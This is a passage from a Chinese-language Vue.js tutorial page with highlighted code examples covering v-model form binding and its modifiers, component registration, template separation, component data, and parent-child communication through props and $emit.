class="line"><span class="keyword">let</span> result = nums.reduce(<span class="function"><span class="keyword">function</span>(<span class="params">preValue, n</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> preValue+n</span><br><span class="line">&#125;, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><h1 id="2-v-model"><a href="#2-v-model" class="headerlink" title="2. v-model"></a>2. v-model</h1><p>表单绑定，实现表单元素和数据的双向绑定</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;message&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">:value</span>=<span class="string">&quot;message&quot;</span> @<span class="attr">input</span>=<span class="string">&quot;message=$event.target.value&quot;</span>&gt;</span>  // v-bind加事件实现双向绑定</span><br><span class="line">    &#123;&#123;message&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">        data: &#123;</span><br><span class="line"><span class="javascript">            message: <span class="string">&#x27;test&#x27;</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>绑定radio控件</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;male&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;male&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;男&quot;</span>&gt;</span>男</span><br><span class="line">    <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;female&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;female&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;女&quot;</span>&gt;</span>女</span><br><span class="line">    <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    &#123;&#123;gender&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">        data: &#123;</span><br><span class="line"><span class="javascript">            gender: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>修饰符</strong></p><p>lazy：懒加载，失焦的时候或者回车的时候，才更新变量</p><p><code>&lt;input type=&quot;text&quot; v-model.lazy=&quot;message&quot;&gt;</code></p><p>number：对输入的类型限定为数字</p><p>trim：对输入的内容去除空格</p><h1 id="3-组件化"><a href="#3-组件化" class="headerlink" title="3. 组件化"></a>3. 组件化</h1><p><strong>使用组件的步骤</strong></p><ol><li>创建组件构造器：<code>Vue.extend()</code></li><li>注册组件：<code>Vue.component()</code></li><li>使用组件</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">my-cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">my-cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> cpn = Vue.extend(&#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">        template: `<span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">p</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                   <span class="tag">&lt;/<span class="name">div</span>&gt;</span>`</span></span></span><br><span class="line">    &#125;)</span><br><span class="line"><span class="javascript">    Vue.component(<span class="string">&#x27;my-cpn&#x27;</span>, cpn)   <span class="comment">// 全局组件</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                components: &#123;             <span class="comment">// 注册局部组件</span></span></span><br><span class="line">          cpn2: cpn</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>父组件和子组件</strong></p><p>在父组件中的components中定义子组件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn2</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> cpn1 = Vue.extend(&#123;</span></span><br><span class="line">        template: `</span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>标题1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>内容1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">        `</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> cpn2 = Vue.extend(&#123;</span></span><br><span class="line">        template: `</span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>标题2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>内容2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">cpn1</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn1</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">        `,</span><br><span class="line">        components: &#123;</span><br><span class="line"><span class="javascript">            cpn1: cpn1    <span class="comment">// cpn2父组件中定义cpn1子组件</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">        components: &#123;</span><br><span class="line">            cpn2: cpn2,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>语法糖写法</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">my-cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">my-cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    Vue.component(<span class="string">&#x27;my-cpn&#x27;</span>, &#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">        template: `<span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">p</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                   <span class="tag">&lt;/<span class="name">div</span>&gt;</span>`</span></span></span><br><span class="line">    &#125;) </span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">my-cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">my-cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">          components: &#123;</span><br><span class="line">          cpn2: &#123;</span><br><span class="line"><span class="handlebars"><span class="xml">            template: `<span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">p</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                   <span class="tag">&lt;/<span class="name">div</span>&gt;</span>`</span></span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>模板分离</strong></p><p>text/x-template或者直接template标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn2</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/x-template&quot;</span> <span class="attr">id</span>=<span class="string">&quot;mycpn&quot;</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;mycpn2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>标题2<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>内容2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">        components: &#123;</span><br><span class="line">            cpn: &#123;</span><br><span class="line"><span class="javascript">                template: <span class="string">&#x27;#mycpn&#x27;</span></span></span><br><span class="line">            &#125;,</span><br><span class="line">            cpn2: &#123;</span><br><span class="line"><span class="javascript">                template: <span class="string">&#x27;#mycpn2&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>组件数据存放</strong></p><p>data属性，但必须是一个函数</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;mycpn2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>标题2<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">        components: &#123;</span><br><span class="line">            cpn2: &#123;</span><br><span class="line"><span class="javascript">                template: <span class="string">&#x27;#mycpn2&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;   <span class="comment">// 必须是一个函数，返回一个对象，函数新分配一个内存空间，组件之间的值不会相互干扰</span></span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                        message: <span class="string">&#x27;testme&#x27;</span></span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>组件通信</strong></p><p>父组件向子组件传值使用：props</p><p>子组件向父组件传值使用：$emit events</p><p>父组件传值，通过v-bind读取父组件的值：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn2</span> <span class="attr">:cmovies</span>=<span class="string">&quot;movies&quot;</span> <span class="attr">:cmessage</span>=<span class="string">&quot;message&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;mycpn2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>标题2<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;cmessage&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">v-for</span>=<span class="string">&quot;item in cmovies&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> cpn = &#123;</span></span><br><span class="line"><span class="javascript">        template: <span class="string">&#x27;#mycpn2&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        props: [<span class="string">&#x27;cmovies&#x27;</span>, <span class="string">&#x27;cmessage&#x27;</span>],</span></span><br><span class="line"><span class="javascript">                props: &#123;           <span class="comment">// 类型限制</span></span></span><br><span class="line"><span class="javascript">            cmovies: <span class="built_in">Array</span>,</span></span><br><span class="line"><span class="javascript">            cmessage: <span class="built_in">String</span></span></span><br><span class="line">        &#125;  </span><br><span class="line"><span class="javascript">          props: &#123;         <span class="comment">// 类型和默认值</span></span></span><br><span class="line">            cmovies: &#123;</span><br><span class="line"><span class="javascript">                type: <span class="built_in">String</span>,</span></span><br><span class="line"><span class="javascript">                <span class="keyword">default</span>: <span class="string">&#x27;123&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                          required: <span class="literal">true</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">        components: &#123;</span><br><span class="line">            cpn2: cpn</span><br><span class="line">        &#125;,</span><br><span class="line">        data: &#123;</span><br><span class="line"><span class="javascript">            movies: [<span class="string">&#x27;test1&#x27;</span>, <span class="string">&#x27;test2&#x27;</span>, <span class="string">&#x27;test3&#x27;</span>, <span class="string">&#x27;test4&#x27;</span>],</span></span><br><span class="line"><span class="javascript">            message: <span class="string">&#x27;父组件数据&#x27;</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>子组件向父组件传递</p><p>通过$emit发送事件的方式传递</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn2</span> @<span class="attr">itemclick</span>=<span 